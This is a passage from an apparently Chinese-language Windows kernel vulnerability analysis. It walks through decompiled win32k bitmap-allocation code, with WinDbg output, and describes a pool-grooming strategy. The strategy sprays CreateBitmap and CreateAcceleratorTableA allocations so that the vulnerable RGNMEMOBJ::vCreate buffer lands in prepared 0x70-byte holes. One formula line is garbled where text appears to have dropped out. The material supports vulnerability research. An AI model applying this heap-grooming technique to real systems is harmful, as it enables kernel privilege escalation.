确定的位图像素位类型接下来在 `SURFMEM::bCreateDIB` 函数中被用来确定位图数据扫描线的长度。在这里需要理解扫描线的概念：在
Windows 内核中处理位图像素数据时，通常是以一行作为单位进行的，像素的一行被称为扫描线，而扫描线的长度就表示的是在位图数据中向下移动一行所需的字节数。
位图数据扫描线的长度是由位图像素位类型和位图像素宽度决定的：
      v12 = *(_DWORD *)a2 - 1;
      v40 = 1;
      v44 = 0;
      switch ( v12 )
      {
        case 0:
          v13 = *((_DWORD *)a2 + 1);
          if ( v13 >= 0xFFFFFFE0 )
            return 0;
          v14 = (struct _DEVBITMAPINFO *)(((v13 + 31) >> 3) & 0x1FFFFFFC);
          goto LABEL_4;
        case 1:
          v15 = *((_DWORD *)a2 + 1);
          if ( v15 >= 0xFFFFFFF8 )
            return 0;
          v14 = (struct _DEVBITMAPINFO *)(((v15 + 7) >> 1) & 0x7FFFFFFC);
          goto LABEL_4;
        case 2:
          v16 = *((_DWORD *)a2 + 1);
          if ( v16 >= 0xFFFFFFFC )
            return 0;
          v17 = v16 + 3;
          goto LABEL_9;
        case 3:
          v18 = *((_DWORD *)a2 + 1);
          if ( v18 >= 0xFFFFFFFE || v18 + 1 >= 0x7FFFFFFF )
            return 0;
          v17 = 2 * v18 + 2;
          goto LABEL_9;
        case 4:
          v19 = *((_DWORD *)a2 + 1);
          if ( v19 >= 0x55555554 )
            return 0;
          v17 = 3 * (v19 + 1);
    LABEL_9:
          v14 = (struct _DEVBITMAPINFO *)(v17 & 0xFFFFFFFC);
          goto LABEL_4;
          ...
      }
清单 5-7 函数 SURFMEM::bCreateDIB 用位图类型确定位图扫描线的长度
位图扫描线长度和位图像素高度的乘积作为该位图数据缓冲区的大小。在调用 `CreateBitmap` 传入参数时，如果 `cPlanes` 调色盘参数指定为
`1` 且 `cBitsPerPel` 像素位参数指定为 `8` 位，则内核中计算分配的位图数据缓冲区大小的计算公式：
    size = ((cxBitmap + 3) & ~3) * cyBitmap;
这样的话，当像素宽度参数为 `4` 的倍数时，像素宽度和高度参数的乘积将直接等于内核中分配的位图像素数据缓冲区的所需大小。这是由于虽然 `8`
位的位图像素点存储占用 `1` 字节，但位图数据扫描线长度是按照 `4` 字节对齐的，所以不足 `4` 字节的需补齐 `4` 字节。而对于 `32`
位像素点的位图，由于单个像素点存储占用 `32` 位即 `4` 字节内存空间，则位图扫描线的长度就等于位图像素宽度的 `4`
倍，分配像素点数据缓冲区大小的计算公式变成：
    size = (cxBitmap so.cjBits` 成员），把位图像素数据的起始位置存储在 `SURFACE+0x2C` 字节偏移的成员（即
`SURFACE->so.pvBits` 成员）中，并在随后将 `pvBits` 的值更新到 `+0x30` 字节偏移的成员（即
`SURFACE->so.pvScan0` 成员）中：
      if ( BaseAddress || Object )
        *((_DWORD *)*v9 + 0xB) = BaseAddress;
      else
        *((_DWORD *)*v9 + 0xB) = (char *)*v9 + SURFACE::tSize;
      v33 = *(_DWORD *)v10;
      if ( *(_DWORD *)v10 != 8 && v33 != 7 && v33 != 9 && v33 != 10 )
      {
        *((_DWORD *)*v9 + 0xA) = (_DWORD)a2 * *((_DWORD *)v10 + 2);
        if ( !(*((_BYTE *)v10 + 0x14) & 1) )
        {
          ...
        }
        *((_DWORD *)*v9 + 0xD) = a2;
        goto LABEL_76;
      }
      ...
      {
    LABEL_76:
        *((_DWORD *)*v9 + 0xC) = *((_DWORD *)*v9 + 0xB);
        goto LABEL_78;
      }
清单 5-8 函数 SURFMEM::bCreateDIB 初始化 SURFOBJ 关键成员
位图数据扫描线的长度被存储在 `+0x34` 字节偏移的成员（即 `SURFACE->so.lDelta` 成员）中。
这样一来，成员 `pvScan0` 将指向当前位图表面对象的像素点数据缓冲区的起始位置。在后续对位图像素点进行读写访问时，系统位图解析模块将以该对象的
`pvScan0` 成员存储的地址作为像素点数据区域起始地址。
图 5-4 成员 pvScan0 指向像素点数据区域起始地址
由于太小的内存块在分配时被安置在随机区域的可能性大很多，所以为了能使 `RGNMEMOBJ::vCreate`
函数分配的内存块能更大概率地被分配在我们精心安排的空隙中，现在将其分配的内存大小稍作提升，从 `0x18` 提升到 `0x68` 字节，加上
`POOL_HEADER` 结构的 `8` 字节，将会占用 `0x70` 字节的池内存空间。这样一来，画线数目就需要从 `0x6666665` 提升到
`0x6666667` 条。
在此处打算通过多次调用 `CreateBitmap` 函数分配大量的 `0xF90` 大小的内存块，以留下足够多的 `0x70` 字节间隙作为
`RGNMEMOBJ::vCreate` 分配 `0x70` 字节内存块时的空间候选。根据 Windows
内核池内存分配逻辑，在分配不超过内存页大小的内存块时，分配的内存块越大，被分配到内存页起始位置的概率越大（但并不是绝对的，只是概率增大；只要存在恰好容纳该大小内存块的内存空隙，内存块就会被分配在其中的）。在前面的段落中提到，位图表面对象的像素数据大小不超过
`0x1000` 字节时，分配的内存将 `SURFACE` 类对象包含在内并放置在缓冲区开始位置，占据 `0x154` 字节的内存空间。除去池内存块的
`POOL_HEADER` 头部结构的 `8` 字节大小和 `SURFACE` 类对象的大小，实际需要分配的位图像素数据的大小为 `0x‭E34‬`
字节。计算后得到如下参数值：
    CreateBitmap(0xE34, 0x01, 1, 8, NULL);
编译后实际执行时可以观察到，函数 `AllocateObject` 中分配的对象内存被分配在一个内存页的起始位置，内存块的大小为 `0xF90`
字节，其后留有 `0x70` 字节的空闲内存空间：
    win32k!SURFMEM::bCreateDIB+0x25c:
    94190172 e8c51cffff      call    win32k!AllocateObject (94181e3c)
    kd> dc esp l4
    97bb7b18  00000f88 00000005 00000001 00000001  ................
    kd> p
    win32k!SURFMEM::bCreateDIB+0x261:
    94190177 8903            mov     dword ptr [ebx],eax
    kd> !pool eax
    Pool page ffa0e008 region is Paged session pool
    *ffa0e000 size:  f90 previous size:    0  (Allocated) *Gh15
             Pooltag Gh15 : GDITAG_HMGR_SURF_TYPE, Binary : win32k.sys
     ffa0ef90 size:   70 previous size:  f90  (Free)       ....
清单 5-9 函数 AllocateObject 分配的对象内存的内存块位置和大小
接下来就是执行前面漏洞验证章节类似的代码以触发漏洞。但在笔者实际测试的时候发现，函数 `RGNMEMOBJ::vCreate` 调用
`ExAllocatePoolWithTag` 分配的内存块并不会被安置在我们所预留的大量的 `0x70`
字节大小的空间中，而仍旧被分配在了一些随机的空隙。这是由于系统中原本就恰好存在一些 `0x70`
字节的空隙，这样一来就需要提前将这些空隙填充，以迫使漏洞关键缓冲区被分配在我们预留的空隙中。
原本打算继续通过调用传入特定参数的 `CreateBitmap` 函数填充系统原有的 `0x70` 字节的空隙，但由于 `SURFACE`
头部结构就已经占据了 `0x154` 字节的大小，所以未能成行。在这里参考一些其他的分析文章，转为使用 `CreateAcceleratorTable`
函数。通过调用比 `CreateBitmap` 更多次数的 `CreateAcceleratorTableA` 函数创建
`AcceleratorTable` 内核对象以填充内存空隙、然后在其中制造空洞的方式，为使 `RGNMEMOBJ::vCreate`
分配的内存块能够命中我们安排的空洞提升更大的概率。
* * *
**创建快捷键对应表**
函数 `CreateAcceleratorTableA/W` 用来在内核中创建快捷键对应表。该函数存在 `LPACCEL lpaccl` 和 `int
cAccel` 两个参数。参数 `lpaccl` 作为指向 `ACCEL` 结构体类型数组的指针，`cAccel` 表示数组的元素个数。结构体
`ACCEL` 的定义如下：
    typedef struct tagACCEL {
        BYTE   fVirt;
        WORD   key;
        WORD   cmd;
    } ACCEL, *LPACCEL;
清单 5-10 结构体 ACCEL 的定义
该结构体用于定义使用在快捷键对应表中的快捷键，单个元素占用 `6` 字节内存空间。通过函数 `CreateAcceleratorTableA`
分配内核池内存块的调用路径：
图 5-5 函数 CreateAcceleratorTable 分配内核池内存块的调用路径
在函数 `win32k!NtUserCreateAcceleratorTable` 中将参数 `cAccel` 乘结构体 `ACCEL` 的大小 `0x6`
并作为参数 `a2` 传入 `_CreateAcceleratorTable` 函数；在 `CreateAcceleratorTable` 函数中参数
`a2` 被增加 `0x12`，增加后的数值作为分配对象的完整大小并被传入 `HMAllocObject` 函数调用。`0x12` 是管理
`AcceleratorTable` 数据的结构体 `ACCELTABLE` 的大小。随后在 `ExAllocatePoolWithQuotaTag`
函数中进行一系列参数变换并最终调用 `ExAllocatePoolWithTag` 函数分配内存块。
注意到在 `Win32AllocPoolWithQuota` 函数中调用 `nt!ExAllocatePoolWithQuotaTag` 函数时传入的
`PoolType` 参数为 `0x29`，该数值是 `0x21` 与 `0x08` 进行逻辑或运算后的数值。`0x08` 在此表示
`POOL_QUOTA_FAIL_INSTEAD_OF_RAISE` 标志位，用于在调用分配内核池内存块的函数时，当内存分配失败，指示函数返回 `NULL`
而不是抛出异常。
      bRaiseFail = 1;
      if ( PoolType & 8 )
      {
        bRaiseFail = 0;
        PoolType &= 0xFFFFFFF7;
      }
      _Process = KeGetCurrentThread()->ApcState.Process;
      _PoolType = PoolType + 8;
      if ( NumberOfBytes > 0xFF4 || _Process == PsInitialSystemProcess )
        _PoolType = (unsigned __int8)_PoolType - 8;
      else
        NumberOfBytes += 4;
      buffer = ExAllocatePoolWithTag(_PoolType, NumberOfBytes, Tag);
清单 5-11 函数 ExAllocatePoolWithQuotaTag 执行参数变换
当分配的内存块大小不超过 `0xFF4` 字节时，函数 `ExAllocatePoolWithQuotaTag` 在调用
`ExAllocatePoolWithTag` 分配内存之前会将内存块大小参数增加 `4` 字节。这样一来，我们在调用
`CreateAcceleratorTableA` 函数时，只需给参数 `cAccel` 指定 `0x0D` 数值，并为参数 `lpaccl`
指向的缓冲区安排足够个数的元素，那么在内核中分配的内存块包括 `POOL_HEADER` 结构在内将是 `0x70` 字节大小，末尾不足 `8`
字节的会补齐 `8` 字节。
    nt!ExAllocatePoolWithQuotaTag+0x52:
    83eb4bf1 e80f940700      call    nt!ExAllocatePoolWithTag (83f2e005)
    kd> dd esp l4
    98bafb40  00000029 00000064 63617355 00000008
    kd> p
    nt!ExAllocatePoolWithQuotaTag+0x57:
    83eb4bf6 8bf0            mov     esi,eax